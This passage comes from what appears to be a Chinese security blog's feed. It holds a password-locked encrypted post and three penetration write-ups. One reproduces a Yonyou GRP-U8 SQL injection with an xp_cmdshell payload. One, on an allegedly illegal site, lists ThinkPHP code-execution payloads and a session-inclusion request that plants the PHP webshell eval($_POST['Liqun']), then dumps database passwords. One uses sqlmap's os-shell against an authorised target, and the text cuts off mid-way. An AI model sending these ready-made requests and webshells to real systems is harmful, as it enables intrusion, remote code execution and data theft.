227b47ac02e31946db6c65020d558dd99a24d8a52b68f379aaf2ef8b8f12a1bf28e29bd330d3e23db91e504b38751e996140adeafe1133294e6085cf27153a7f1a534de5971bb169150dff4111aa23e674e5633d2a72bbf0e21be8519376e2e7c1c12a6e47a501c7ed14a6900427fce7781dfe6cff74ca524d805972bce3c55526f58a842190c809f35a3ee8d12f9184670076f1946c96a7623b5297c0c83682e6480a115dc6f5e4118c119893040d6f1f06264cf0985f7f8f6d387a09a587ae7fdfae8d720da5bb2d51c6ee75097b7c9a81529fd2e76b13432ed63701dfe7982260b717cf7583061532501bfd55666b853ae07becb7d43312c6d21d97afcd54895ce542ef4bcb898c7ca52efec4eb07007df93925980eebf8d1fef2fbfdbd2abfae0dcc8e50cbf0274a27010d9bf83432a6e95090d7ccfe7ea46598d39be5d098351033f3ea9718796c7b4346dfc853ce94685f05c70fcccc8bc2978471b933c90f202ae1572e3dbbc9aea70be0e5f1132347b72a371e1ef8744f9d9c424e2b1367bada4b918f26356178d52c3bfe4d18fb330547003a385960de8413d621007bb47b3ef556af28cce917e70d26b00b03f6bb1493cf0421253fec722dfa6b671298b804edd772f86a969d01db9b0455c2b0b6cbef5f077b6d1a96cc6427e015bf66354414287bcfc4dc1d74e32e08e3f88874a4e3fe58af2ee8c79815b008e068251e29c69cab7fcf8cd63782e730335f5e7d790109a2316c5c6999fa9fdab9eea5e508768e65a073c28409d6ac63c99380d5d5a74baf1f230816c91eb6af9ddf532ff64e128731ee32ad2a7d3c3e8cc884d93aa16bbd654969b3a8a002f1171943389da6f5a053fe73f39fde4e1ee23c4c8c9f5a6d159b78d5f5f87160a664f027e2c3dd486e9a1978c5d7a65d57198fb5c2a366690f1841af1c51830b18a9e8fea75c05582a3940e814d32356bc9f22f620478f5da7fb61fda3d6540c2f7c7d082d07f14ccbdff7b4766ccb5330f8b8ae0e64d73cb8249f7f9bb9945b3a54e7ac9e9b432db88d29ac25058459d9d75eb0d35a3e068a47cebaa473339b6871f7e5ebf86e65494c41d2ce02f4b1ca63d7218a6ab3cf8978718fab5a8603949d90f5f6467bff756f0da08f2110615f6e4d254ce049ad10f44a5842177d99378a9e4f5ea109cf5c05b594b1b458b4398503d2a272774e6503f3fb39a3df4b8cfbab0ff54ffb77f7dba03b310a52c0e1d792cdcf2c2c27460f24565bdfdf0ffbf38188c718aae02594844c073e86b4ce1f3707a1290676e95491a9a2ff405b8c6e1c7501c68c302deecdabce9a21e33cea5420d5b37d48450276acc175b06adda1eb7124646007d40b8cd6bccbb28bb86b1088c54af28f873db13b3b70abd7797d351ad2a9bf78641bb65c76404cab91a7eaa83059afa7b61faf45ed983b346f1648186010af6b296c08fda2a6d4313e73c66961bbb5fb220a7d9feafb56575c14d1b46ff0c44ddae065169d7724bc1069fbba91b4d37565f20728da64ef163da620492b3e9795fd97629ca38a75df17ce2e7306a7ad4716857648c0e3c314ccd86a943c333f616f6bc09cee8af456adbd2dcb5783eba7b8464e4785c2ffdd5e33537acb3a7848f149f96a3485496aad05f4380f25d7b89ed67ab63bd15b8d9ec2321344b747d1a89e80588086af9d1b8fcef0292fe6026f5bc9cb46dcbc9e3bca808604da1e15fdfc89109d408247f474404dfc8209515a50e812fc9881224b23b7fade880b601de109547d0f27890c354bb73e7c7fd9b55a222aece2b86344938267f9d305090e3873b073a25aed7434379dd728719759a851bddd866757f6a59e7e82120c0638d72106bfcb1bd20fa5b6069eef80b2f81cbdeaa7296d2251ac66b6dc65c9d265ff4bf99055c3fc015865d82e7197d8a47711da347006e09449c5592a4860592efe6d62fca9e786b472899c8b9de313ed8cd1663634078fca2e5a3c8daeb680ba7fb52ecfbc24dffb976abea66f015da82a4d4df728f19ea37b789d37a57a359c4a6f5fd53bda3d717a797f09f24c3d16bae780ac41f1c82b790f55b450c2feb31c9b9ec43999cbe1b9c06f424cfb7998a29d62963810cfe87652dac3139fb937c1a5f747dd5b7ea1f5475b341fb5878e78d7397413204ee025b8d058c6a6d94c02f258b56e367701570ae0a9870ca530786d45a168c9d567e8cc288a208d336d5dd15080adfb0c7dec363cc506428fbd079692723b3ac248950d2bd8d5f6a18c9982eadf7807f4f28f9872e17c4bcaac5ed1cc9feccf40c36375b0368e1e323b89c233bdbe82831e9e2f0f28a9f7ebb24b595e6bbe4f87223e441cfc84ab583dde182ac407662f29da22ce24233e96d79d9c487a1ef295e8472cb86572717931fefea77f4732b016d0c709eb9f63fa4220b97dba1d7d037f4615c7bfd2b92acc45632c83c8b7a7cf18ecbee3a40aa68cbf594c59c7016056f024734b683be1069e82c2f02561280caa65aa6c0ad342d040462f7b399bcb8ed509d4e5a0867e029e12d6ae0dbf987d27e704def27621fc7d9408605b45cfccc13b2254107ba4cfda313ed7499363933f8a30ac7d04fca056b892861cf7e7ed17da1868b64db535075820f652cd4a5eae3bb575e585535525c5de484a74c3d7ce6d7237a90987679c6b5205fdefd10811cb430c8bb416d573dc061fec2c3eab97cc963b3023de6f70a22f67e57e636b1015d13e1a9ec435deda61dee8f2692c5fdc6ccd7fa34a9da912db137a278d13e630c66bbcf00b8a352f5d677f6b7bb1161a30d9f4d0dcbf9ce9fb39ec5ff530594f911dc06757bb1d5671c256eacffbd221ab2d49debb4b31c92c4fb57aadbfd51458763fed9de8060449f7072bbc00f00cabe4b4ec5d05a29e0c3b595e679a633a5be43078824d1bef5bd02818197bd83894e911509abdfbe6aaea444a9e97746b634c9e7a0ec948944b383c3ccd33b2d2e1c6b1832a7f5a88e5143cbaf6a0408647b8a98b8bb226248dde8b3ea7822d0e4f86e2d51f37957fcb622ea2e52bec04d5f0a617037ad5ef132c32cd1f4f5cd52b61fe920eeb2650dd23a9960b70b954d01eb2d389ca08b36ac4bd939c8437259555f58554c41c4230b66e43278ab4360a3d8759d125fe46580758aea0da294437e7c0d8881859d22ad24afc63e7c26ea1be9c5faf80cebbceec81d08a3667b0820f10062c3f5b3b6c104e22d3cb18bb31448c4a4da729c12c6aaae0b6156fb53211d4cea362840d589c5d04d1f7198248a8557a682bbd398a41971ea359d6cfdd232eb87aae4533cf59dd9cd63aeb58dde778a95bdec30af5ae6c5b813dc4d2ea766aaa2a92fc8236ff191455c34c80419a32ccba62e6e11b1a22d77fb3b83af0472226608615e8b6c10cfb877b80e4265d4bed709a5e6f17db8360d19929b6f78bfdbebadb09a679bb7c428473e874c9a79c57addf4fc57bd359cabc265f70461030d300797af75b860cba1ed8a90e47575f576fa7fa89277a85a4a9777c1a98f6d51db37c5e63bcb9faa5caa569e3691e7c78185a3350a99ec870d7852b0e23c3653ca333c9beab4907f562fcd35e173ff08cd2ca8c594ef9f26e58e16275dfe8dbf38f060f4eb692517d7fa9bf385132c090c2ca298cc70d3cb34dfdc87bc9214511523a2ce0b8dbf912717d97dc304f71c446d44a664413acf56df24512d37d4f21e33f8358e920903792112adfd8120f132be3e0b578efd5f693342aed8c017afdc09b051c92493e06d41650f5eba79c60d01ebbd68a73b1c02cfd444c2426d577e6c935eb23732ce78b5907a82d36598752be0164b449708df6965024ee1fecd963ccb342c90401633c0a8f1901fe982889baa7b180bcda4ab14c8e9e3eecad6210c99c055f4b70b5f2b6fd2e86a06bfc1c2b181ae667f29575555d14da1c42d6c9911ddbb180ffc622abe3d1e1c5f7ad07e4a741237dab70af3dd310570f4f43fe9d1d6f27b099ec931eba2e2569666f2f5463ef8c982448d121247792ad60937b0dbbcfec2f114f64d1fe46be6d06d1da720467aa584495156d10d3d83e82fc1b75b10d83322d17a3db0204250ec8ef555982f05d31f8d3e21ba2fcab4632266c3494508f3cb22ba25a808e480b4f7a38b73c3afc21f2c332b9cf17528237afa888d64f28e1041bf196ea5fc22e3fd8e6b38d120ccd8040a028ca2666332dbe47b46287709ac8449176b6e7c74a59d9e175ecffe3db17c853dc7a9f0b4e6f6a4bac321ea6f03fdf61ee952799a6ec87eb5f86d65db97e57fd43591fe8a8ccb725afc76476616c17478271cd7624669273d0ac56ac16270430d81b41e5ff690dcf6a8b0d07352cb7ed814fc98bebf29d6755110086ea4a67c444440e8c1158fee1fdc083ee05f2f67bbad38216a7d6260c7d58d1da2045cd13c5b5491b8f5337cb04f74443a982e3b191332f7689d51b9daa419b4f5c1b861fc2f66cad31698c0a15a55bb7bddf96400e548fa0971b977196f4f4fee350cc6de720ff9b7a66127c57ba264fcbc5291ddb066334708b54a7d34f16d9098752b199b548a426171de7224d72520844a1172f3398b5751c0e977b5aec14efbe38f0c5ceec8aecda19df7a7153508a6608a4e679ee85f649ff73dc3cc0a6bec8e92b0b36d69a2e7462a7fed4250ca8c43db1c4c2f01f165386bdf15dcd9ff0189f4b0e08201ae9beb74f957e174c8736e406bd64536a8e2a35cf2a6395fdfe8b2842032b18016effe9aadafa2633eb8665f9618bd0507e2965bee0abb68bd18f57a832657c31d1b5adc498ab31a702f0da8690591ad8fd1d96a4e9d49e197ae99bfe1654b140c57af7764d9f307eec936d13b30b10403e0cf515427a8251ecb3e7d1de543167902280a326cd18c1842ba8ff32d75a99241b98f9fc94d9fef6a19ad784f695fbd6baef867e375ca0894306dbb0d45816ecf5542e40fa1de02fdee9bd08be2ccaa79b21ec49650c02b55e6a76ca9f3a11152218d0812bc5ec9900fb732f841f690d6df5ea5233286287f26b08eb8a92d1f25ddff32d919e33858cbfbc343023334ac86b6fe5c663254023c0d834a9f031b77150100be83b3ac43bc11cccdd9a8207be39eedbd32317aa612ba30be92d34af51a7b96a31eed4ae1ae9a37fa8e870012795d2f46d5a9012ac7777c5d1b343085bd87c58fb133f59cdc3452e1bca39bc646e13339c619cd2255de8cd85206673ac48597a7be119cbed512b6d478f271fb495777b018deee6a82194726adb22c18670978fa79ca3f13d286086a6daf35ac8d89c5cbf4028b6c091c3035ed17ae776ffa618b57ca22757743de0b9ba4c62db176f810ba2a0605fe0c2b248bb4eb893cc4753ccbeae4541433aa80261659617119fc2ab24906618b0cfefa856edb53e40c251b71dbbc62186b5e47d15d2694e27123a846942e177f2e1f3380686953e1b7a3d9e1af06b475e38d04641d91ef759c9fe6464e798a8485a1cd0c4e3910a1268a602ec7fc8b14514edf7732163b1ac77d173e6af68483100bf021c4332f39b0d9f6931105ecd38038ce5a0e98d1a14ae9e6dad16a2260c12f301b9b02d12376277640d5802611a8d8668875e8052898d6918edc035cb7118e25e285262526cd6964f559b9d682d5dc2112720d12f496c9c6655640fab66c3341c5a24da9893a876c26236ab873e7693c45a4db3267a401691afc0a85b1e65f154facfbbfef55f0c14b70d131ce68285fa427295d3ce70dbb2e57bd3ccccd8341e4535a5e67d81a94cbad721dd52518d2927291746fafeab523c27c06c28b446088033d29c7c60dc9d878d4aaacbf2a362a7de83c844faa91e167a83176e7e5b948b767631bd97b275162c23fe9a91032ea2195f433d094e8541137e54115c15434e8fe723c6534b0163d67de6e17177deac0d58b60cba0c46962ca67275b4409a3d4a83b4770312ee9b2493c50d5367f2b5d5ee4a3f52958a5e6a343ec75d6b163e1c9c8289654829c5963aaf00193c1655f034480d96607d1b6ae7117f4ea13c95527d3b807597cd99f70cad62cca78c22fd671cc72c849efaa7422568ba50d214216351f6a4543d8d3103dbbed3f7e799ed55759eb7512894ba6f0882700577ecaddb92b0a60d8df3da1004f49b7447625d3ca807838568ebe95f2606bc6ee51bce494615c560aa95304b15c3aba7ee4746e64a6d8f877ea3fbd230bb7702e4234d6b1360df9a0317ee390c3cad6adaf0184f2dc946869a49fa8ecec6688606422ca910a923b99d23b91c04398b5fd9c0f519eecb246db6dd2a91dc72d9cacf7d52a9d7c9f769d73693bb16cde30e5c837719e927471d581536553b88786e21777210e48f3225692c57436bd5270f933e7a044a2d49dd702f76cc512b481a78c551fdc99a44b07522bb3437ed3b65fdf748b6b3f35f18d1aa88e8119049e72c3b643c90cf6e36d73225e9b81c315d57f0d9b0581cbaa6ecca86e4535bd8310faad7dfbb18047945045f07f763f5854489a737638e0d768c36af3f63dd41237e3a31f5db707c15f70b7a1fbb16a4804ef509bb2eff2fe44bf13f3472a077c77a24e461bf6b4a7f9a5d70f10e92a2b24ba56cb61531af24217c0b3b2f5ecbb63fa1c140d8cd79fff559a0de212eb1e13ab1c51488626a645aec28b3f722332ad8274ca6f9d13d5780</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂不公开                                                                                                                                                                                   .</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 记录 </tag>
            
            <tag> 密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用友GRP-U8 SQL注入复现 外加发一个通用注入点</title>
      <link href="2020/10/30/%E7%94%A8%E5%8F%8BGRP-U8/"/>
      <url>2020/10/30/%E7%94%A8%E5%8F%8BGRP-U8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="影响范围-用友GRP-U8系统"><a href="#影响范围-用友GRP-U8系统" class="headerlink" title="影响范围  (用友GRP-U8系统)"></a>影响范围  (用友GRP-U8系统)</h3><h2 id="1-复现网上的poc"><a href="#1-复现网上的poc" class="headerlink" title="1.  复现网上的poc"></a>1.  复现网上的poc</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1604023148741.webp" alt="image"></p><p>大神们已经爆出了利用方式</p><pre><code>POST /ProxyContent-Type: application/x-www-form-urlencodedcVer=9.8.0&amp;dp=&lt;?xml version=&quot;1.0&quot; encoding=&quot;GB2312&quot;?&gt;&lt;R9PACKET version=&quot;1&quot;&gt;&lt;DATAFORMAT&gt;XML&lt;/DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;/NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;/NAME&gt;&lt;DATA format=&quot;text&quot;&gt;DataSetProviderData&lt;/DATA&gt;&lt;/PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;/NAME&gt;&lt;DATA format=&quot;text&quot;&gt;exec xp_cmdshell &#39;ipconfig&#39;&lt;/DATA&gt;&lt;/PARAM&gt;&lt;/PARAMS&gt;&lt;/R9FUNCTION&gt;&lt;/R9PACKET&gt;</code></pre><h3 id="直接复用poc即可"><a href="#直接复用poc即可" class="headerlink" title="直接复用poc即可"></a>直接复用poc即可</h3><p> <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1604023462049.webp" alt="image"></p><h2 id="2-外带发一个通用利用点"><a href="#2-外带发一个通用利用点" class="headerlink" title="2.  外带发一个通用利用点"></a>2.  外带发一个通用利用点</h2><pre><code>POCPOST /U8SMSProxy?class=XXNote&amp;id=qryyfs HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: JSESSIONID=FD111DFB1059473AF214DB0E529918E5DNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 78begindate=2020-09-27&amp;enddate=2020-10-27&amp;search=</code></pre><h3 id="sqlmap无脑梭哈就行"><a href="#sqlmap无脑梭哈就行" class="headerlink" title="sqlmap无脑梭哈就行"></a>sqlmap无脑梭哈就行</h3><p> <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1604024847782.webp" alt="image"></p>]]></content>
      
      
      
        <tags>
            
            <tag> getshell </tag>
            
            <tag> 用友GRP-U8 </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次非法站渗透任务</title>
      <link href="2020/10/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%9E%E6%B3%95%E7%AB%99%E6%B8%97%E9%80%8F/"/>
      <url>2020/10/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%9E%E6%B3%95%E7%AB%99%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="接到一个目标域名访问查看"><a href="#接到一个目标域名访问查看" class="headerlink" title="接到一个目标域名访问查看"></a>接到一个目标域名访问查看</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602911708106.webp" alt="image"></p><h4 id="简单扫描了下子域名-发现一个-user-xxx-com-的用户登录的子域名网站"><a href="#简单扫描了下子域名-发现一个-user-xxx-com-的用户登录的子域名网站" class="headerlink" title="简单扫描了下子域名 发现一个 user.xxx.com 的用户登录的子域名网站"></a>简单扫描了下子域名 发现一个 user.xxx.com 的用户登录的子域名网站</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602911942339.webp" alt="image"></p><h5 id="进行常规测试未发现突破口-注册账户进入后发现也只是个普通的用户后台功能很少测试依然无太大发现-其余几个子域名未发现功能页面"><a href="#进行常规测试未发现突破口-注册账户进入后发现也只是个普通的用户后台功能很少测试依然无太大发现-其余几个子域名未发现功能页面" class="headerlink" title="进行常规测试未发现突破口 注册账户进入后发现也只是个普通的用户后台功能很少测试依然无太大发现 其余几个子域名未发现功能页面"></a>进行常规测试未发现突破口 注册账户进入后发现也只是个普通的用户后台功能很少测试依然无太大发现 其余几个子域名未发现功能页面</h5><h4 id="掏出大字典对子域名进行爆破-以扩大渗透面"><a href="#掏出大字典对子域名进行爆破-以扩大渗透面" class="headerlink" title="掏出大字典对子域名进行爆破 以扩大渗透面"></a>掏出大字典对子域名进行爆破 以扩大渗透面</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602912552198.webp" alt="image"></p><h5 id="对这些扫描出来的子域名进行测试出现了惊喜"><a href="#对这些扫描出来的子域名进行测试出现了惊喜" class="headerlink" title="对这些扫描出来的子域名进行测试出现了惊喜"></a>对这些扫描出来的子域名进行测试出现了惊喜</h5><h5 id="在其中一个子域名的真实ip下发现一个端口搭建了网站进行查看"><a href="#在其中一个子域名的真实ip下发现一个端口搭建了网站进行查看" class="headerlink" title="在其中一个子域名的真实ip下发现一个端口搭建了网站进行查看"></a>在其中一个子域名的真实ip下发现一个端口搭建了网站进行查看</h5><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602912758957.webp" alt="image"><br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602912961625.webp" alt="image"></p><h1 id="wow-十年磨一剑"><a href="#wow-十年磨一剑" class="headerlink" title="wow 十年磨一剑 "></a>wow 十年磨一剑 <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602912886345.webp" alt="image"></h1><h4 id="直接掏出-exp-怼"><a href="#直接掏出-exp-怼" class="headerlink" title="直接掏出 exp 怼"></a>直接掏出 exp 怼</h4><pre><code>https://xx.xx.xx.xx/?s=index/indexposts=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter写shellPOSTs=file_put_contents(&#39;Liqun.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert有captcha路由时https://xx.xx.xx.xx/?s=captcha/calcPOST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h4 id="然而怼了个寂寞"><a href="#然而怼了个寂寞" class="headerlink" title="然而怼了个寂寞"></a>然而怼了个寂寞</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602913159979.webp" alt="image"></p><p>// 调用函数或者方法过滤</p><h4 id="很显然敏感函数或方法肯定都残废了"><a href="#很显然敏感函数或方法肯定都残废了" class="headerlink" title="很显然敏感函数或方法肯定都残废了"></a>很显然敏感函数或方法肯定都残废了</h4><h3 id="遇事不要慌-换个方法-操作下-可以直接利用Session-包含-getshell"><a href="#遇事不要慌-换个方法-操作下-可以直接利用Session-包含-getshell" class="headerlink" title="遇事不要慌 换个方法 操作下 可以直接利用Session 包含 getshell"></a>遇事不要慌 换个方法 操作下 可以直接利用Session 包含 getshell</h3><pre><code>PocPOST http://xx.xx.xx.xx/?s=captch HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: PHPSESSID=LIqunDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 105_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=&lt;?php eval($_POST[&#39;Liqun&#39;])?&gt;&amp;server[]=1</code></pre><h4 id="使用poc-发送数据包"><a href="#使用poc-发送数据包" class="headerlink" title="使用poc 发送数据包"></a>使用poc 发送数据包</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602913609708.webp" alt="image"></p><h4 id="然后直接使用蚁剑进行-包含连接就行"><a href="#然后直接使用蚁剑进行-包含连接就行" class="headerlink" title="然后直接使用蚁剑进行 包含连接就行"></a>然后直接使用蚁剑进行 包含连接就行</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602913672441.webp" alt="image"></p><h4 id="就那么开开心心的顺利getshell了"><a href="#就那么开开心心的顺利getshell了" class="headerlink" title="就那么开开心心的顺利getshell了"></a>就那么开开心心的顺利getshell了</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602913749047.webp" alt="image"></p><h4 id="连接后-自行新建-或上传一个马儿-Session-有时效性会失效"><a href="#连接后-自行新建-或上传一个马儿-Session-有时效性会失效" class="headerlink" title="连接后 自行新建 或上传一个马儿   Session 有时效性会失效"></a>连接后 自行新建 或上传一个马儿   Session 有时效性会失效</h4><h4 id="翻出数据库密码-连接内网数据库"><a href="#翻出数据库密码-连接内网数据库" class="headerlink" title="翻出数据库密码 连接内网数据库"></a>翻出数据库密码 连接内网数据库</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1602913979767.webp" alt="image"></p><h4 id="目的达到"><a href="#目的达到" class="headerlink" title="目的达到"></a>目的达到</h4>]]></content>
      
      
      <categories>
          
          <category> 渗透记录 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战 </tag>
            
            <tag> thinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次对某企业的授权渗透测试</title>
      <link href="2020/08/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>2020/08/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h1><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596981232488.webp" alt="image"></p><h3 id="到其官网门户查看了一圈-未发现系统链接-ip为阿里云"><a href="#到其官网门户查看了一圈-未发现系统链接-ip为阿里云" class="headerlink" title="到其官网门户查看了一圈 未发现系统链接 ip为阿里云"></a>到其官网门户查看了一圈 未发现系统链接 ip为阿里云</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596977082693.webp" alt="image"></p><h3 id="通过谷歌语法查询其公司系统资产发现一套gprs系统"><a href="#通过谷歌语法查询其公司系统资产发现一套gprs系统" class="headerlink" title="通过谷歌语法查询其公司系统资产发现一套gprs系统"></a>通过谷歌语法查询其公司系统资产发现一套gprs系统</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596977157553.webp" alt="image"></p><h3 id="访问发现其ip-为真实ip-而且开放了大量端口"><a href="#访问发现其ip-为真实ip-而且开放了大量端口" class="headerlink" title="访问发现其ip 为真实ip 而且开放了大量端口"></a>访问发现其ip 为真实ip 而且开放了大量端口</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596977229919.webp" alt="image"></p><h3 id="对gprs系统真实ip进行全端口扫描继续收集信息-很幸运发现大量其公司资产"><a href="#对gprs系统真实ip进行全端口扫描继续收集信息-很幸运发现大量其公司资产" class="headerlink" title="对gprs系统真实ip进行全端口扫描继续收集信息 很幸运发现大量其公司资产"></a>对gprs系统真实ip进行全端口扫描继续收集信息 很幸运发现大量其公司资产</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596977284921.webp" alt="image"></p><h3 id="对收集的资产进行初步分析与查看发现一个-web-server服务包含大量查询接口"><a href="#对收集的资产进行初步分析与查看发现一个-web-server服务包含大量查询接口" class="headerlink" title="对收集的资产进行初步分析与查看发现一个 web server服务包含大量查询接口"></a>对收集的资产进行初步分析与查看发现一个 web server服务包含大量查询接口</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596977379981.webp" alt="image"></p><h3 id="初步判断这些接口大概率存在sql注入"><a href="#初步判断这些接口大概率存在sql注入" class="headerlink" title="初步判断这些接口大概率存在sql注入"></a>初步判断这些接口大概率存在sql注入</h3><h1 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h1><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596980796489.webp" alt="image"></p><h3 id="使用Netsparker-对其http-xx-xx-xx-xx-service1-asmx-WSDL-文件进行针对sqlserver-数据库的扫描"><a href="#使用Netsparker-对其http-xx-xx-xx-xx-service1-asmx-WSDL-文件进行针对sqlserver-数据库的扫描" class="headerlink" title="使用Netsparker 对其http://xx.xx.xx.xx/service1.asmx?WSDL 文件进行针对sqlserver 数据库的扫描"></a>使用Netsparker 对其<a href="http://xx.xx.xx.xx/service1.asmx?WSDL">http://xx.xx.xx.xx/service1.asmx?WSDL</a> 文件进行针对sqlserver 数据库的扫描</h3><h3 id="果不其然大量接口存在-sql注入"><a href="#果不其然大量接口存在-sql注入" class="headerlink" title="果不其然大量接口存在 sql注入"></a>果不其然大量接口存在 sql注入</h3><p> <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596977828848.webp" alt="image"></p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596977916661.webp" alt="image"></p><h3 id="手动测试用户为sa后-拉出神器sqlmap-直接-–os-shell一把梭"><a href="#手动测试用户为sa后-拉出神器sqlmap-直接-–os-shell一把梭" class="headerlink" title="手动测试用户为sa后 拉出神器sqlmap 直接 –os-shell一把梭"></a>手动测试用户为sa后 拉出神器sqlmap 直接 –os-shell一把梭</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1596978135522.webp" alt="image"></p><h3 id="直接查找网站路径准备写入一句话木马拿shell"><a href="#直接查找网站路径准备写入一句话木马拿shell" class="headerlink" title="直接查找网站路径准备写入一句话木马拿shell"></a>直接查找网站路径准备写入一句话木马拿shell</h3><h4 id="途中出了一点意外-都是由于太菜在找网站绝对路径上整了-半个多小时"><a href="#途中出了一点意外-都是由于太菜在找网站绝对路径上整了-半个多小时" class="headerlink" title="途中出了一点意外 都是由于太菜在找网站绝对路径上整了 半个多小时- -"></a>途中出了一点意外 都是由于太菜在找网站绝对路径上整了 半个多小时- -</h4><h4 id="在D盘-发现大量web应用文件夹-这也让我直接认定了网站在D-盘"><a href="#在D盘-发现大量web应用文件夹-这也让我直接认定了网站在D-盘" class="headerlink" title="在D盘 发现大量web应用文件夹 这也让我直接认定了网站在D 盘"></a>在D盘 发现大量web应用文件夹 这也让我直接认定了网站在D 盘</h4><h4 id="再加上我-dir-e-f-g-都没有发现分区就造成了本次再找路径上浪费了大量时间"><a href="#再加上我-dir-e-f-g-都没有发现分区就造成了本次再找路径上浪费了大量时间" class="headerlink" title="再加上我 dir e:\ f:\ g:\ 都没有发现分区就造成了本次再找路径上浪费了大量时间 - -"></a>再加上我 dir e:\ f:\ g:\ 都没有发现分区就造成了本次再找路径上浪费了大量时间 - -</h4><h3 